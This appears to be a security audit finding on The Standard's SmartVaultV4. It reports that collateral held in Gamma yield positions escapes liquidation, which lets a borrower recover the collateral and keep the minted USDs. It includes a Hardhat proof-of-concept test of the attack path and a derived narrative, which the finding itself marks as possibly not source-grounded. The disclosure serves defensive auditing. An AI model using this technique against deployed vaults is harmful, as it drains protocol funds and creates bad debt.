---
id: 21912
severity: "High"
---

# USDs stability can be compromised as collateral deposited to Gamma vaults is not considered during liquidation

## Description

** Users of The Standard can take out `USDs` stablecoin loans against their collateral deposited into an instance of `SmartVaultV4`. If the collateral value of a Smart Vault falls below 110% of the `USDs` debt value, it can be liquidated in full. Users can also move collateral tokens into Gamma Vaults (aka Hypervisors) that hold LP positions in Uniswap V3 to earn an additional yield on their deposited collateral.

Collateral held as yield positions in Gamma Vaults are represented by Hypervisor tokens transferred to and held by the `SmartVaultV4` contract; however, these tokens are not affected by liquidation:

```solidity
function liquidate() external onlyVaultManager {
    if (!undercollateralised()) revert NotUndercollateralised();
    liquidated = true;
    minted = 0;
    liquidateNative();
    ITokenManager.Token[] memory tokens = ITokenManager(ISmartVaultManagerV3(manager).tokenManager()).getAcceptedTokens();
    for (uint256 i = 0; i < tokens.length; i++) {
        if (tokens[i].symbol != NATIVE) liquidateERC20(IERC20(tokens[i].addr));
    }
}
```

Currently, Hypervisor tokens present in the `SmartVaultV4::hypervisors` array are not included in the array returned by `TokenManager::getAcceptedTokens` as this would require them to have a Chainlink data feed. Therefore, any collateral deposited as a yield position within a Gamma Vault will remain unaffected.

A user could reasonably have a Smart Vault with 100% of their collateral deposited to Gamma, with 100% of the maximum USDs minted. At this point, any small market fluctuation would leave the Smart Vault undercollateralised and susceptible to liquidation. Given that the `minted` state variable is reset to zero upon successful liquidation, the user is again able to access this collateral via [`SmartVaultV4::removeCollateral`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L186) due to the validation in [`SmartVaultV4::canRemoveCollateral`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L171):

```solidity
function canRemoveCollateral(ITokenManager.Token memory _token, uint256 _amount) private view returns (bool) {
    if (minted == 0) return true;
    /* snip: collateral calculations */
}
```

Consequently, the user can withdraw the collateral without repaying the original `USDs` loan. Given the `liquidated` state variable would now be set to `true`, any attacker would need to create a new Smart Vault before the collateral could be used again.

** An attacker could repeatedly borrow against collateral deposited in a yield position after being liquidated, resulting in bad debt for the protocol and likely compromising the stability of `USDs` if executed on a large scale.

## Proof of Concept

** The following test can be added to `SmartVault.js`:
```javascript
it('cant liquidate yield positions', async () => {
  const ethCollateral = ethers.utils.parseEther('0.1')
  await user.sendTransaction({ to: Vault.address, value: ethCollateral });

  let { collateral, totalCollateralValue } = await Vault.status();
  let preYieldCollateral = totalCollateralValue;
  expect(getCollateralOf('ETH', collateral).amount).to.equal(ethCollateral);

  depositYield = Vault.connect(user).depositYield(ETH, HUNDRED_PC.div(10));
  await expect(depositYield).not.to.be.reverted;
  await expect(depositYield).to.emit(YieldManager, 'Deposit').withArgs(Vault.address, MockWeth.address, ethCollateral, HUNDRED_PC.div(10));

  ({ collateral, totalCollateralValue } = await Vault.status());
  expect(getCollateralOf('ETH', collateral).amount).to.equal(0);
  expect(totalCollateralValue).to.equal(preYieldCollateral);

  const mintedValue = ethers.utils.parseEther('100');
  await Vault.connect(user).mint(user.address, mintedValue);

  await expect(VaultManager.connect(protocol).liquidateVault(1)).to.be.revertedWith('vault-not-undercollateralised')

  // drop price, now vault is liquidatable
  await CL_WBTC_USD.setPrice(1000);

  await expect(VaultManager.connect(protocol).liquidateVault(1)).not.to.be.reverted;
  ({ minted, maxMintable, totalCollateralValue, collateral, liquidated } = await Vault.status());

  // hypervisor tokens (yield position) not liquidated
  await expect(MockWETHWBTCHypervisor.balanceOf(Vault.address)).to.not.equal(0);

  // since minted is zero, the vault owner still has access to all collateral
  expect(minted).to.equal(0);
  expect(maxMintable).to.not.equal(0);
  expect(totalCollateralValue).to.not.equal(0);
  collateral.forEach(asset => expect(asset.amount).to.equal(0));
  expect(liquidated).to.equal(true);

  // price returns
  await CL_WBTC_USD.setPrice(DEFAULT_ETH_USD_PRICE.mul(20));

  // user exits yield position
  await Vault.connect(user).withdrawYield(MockWETHWBTCHypervisor.address, ETH);
  await Vault.connect(user).withdrawYield(MockUSDsHypervisor.address, ETH);

  // and withdraws assets
  const userBefore = await ethers.provider.getBalance(user.address);
  await Vault.connect(user).removeCollateralNative(await ethers.provider.getBalance(Vault.address), user.address);
  const userAfter = await ethers.provider.getBalance(user.address);

  // user should have all collateral back minus protocol fee from yield withdrawal
  expect(userAfter.sub(userBefore)).to.be.closeTo(ethCollateral, ethers.utils.parseEther('0.01'));

  // and user also has the minted USDs
  const usds = await USDs.balanceOf(user.address);
  expect(usds).to.equal(mintedValue);
});
```

## Recommendation

** Ensure that collateral held in yield positions is also subject to liquidation.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a collateral accounting flaw in the SmartVaultV4 liquidation logic that allows yield positions held in Gamma (Hypervisor) vaults to be ignored during a liquidation event. The root cause is that the liquidation routine iterates only over tokens returned by TokenManager.getAcceptedTokens, which excludes Hypervisor tokens because they lack a Chainlink price feed. Consequently, when a user moves all of their collateral into a yield position, the protocol’s collateral‑to‑debt ratio is calculated without counting that value. If the market price of the underlying assets drops slightly, the vault becomes under‑collateralised according to the protocol’s 110 % rule, and the VaultManager can call liquidate(). The liquidate() function resets the minted USDs balance to zero, marks the vault as liquidated, and then attempts to transfer each accepted token to the protocol. Since the Hypervisor tokens are not in the accepted list, they remain in the vault untouched. After liquidation the canRemoveCollateral() check sees minted == 0 and therefore permits the owner to withdraw the entire collateral, including the yield tokens, without repaying the original USDs loan. From the user’s perspective the vault shows a liquidated flag but the collateral balance is still present, and the user can withdraw it while still holding the minted stablecoins, effectively receiving the loan amount for free. This breaks the accounting assumption that collateral fully backs the outstanding debt, leading to bad debt for the protocol and potentially compromising the stability of the USDs stablecoin if the attack is repeated at scale. The issue was discovered during a security audit by Cyfrin, which added a test that demonstrated the ability to liquidate a vault with yield positions and then withdraw the collateral. The bug is hard to notice because the vault’s totalCollateralValue reported by the UI may still reflect the value of the yield position, giving a false sense of safety, while the liquidation logic silently ignores it. To remediate, the protocol should treat yield‑position tokens as part of the collateral pool during liquidation, either by providing price feeds for Hypervisor tokens or by adjusting the liquidation loop to include them, and by tightening the canRemoveCollateral() guard so that collateral cannot be removed when any debt remains, regardless of the minted flag.
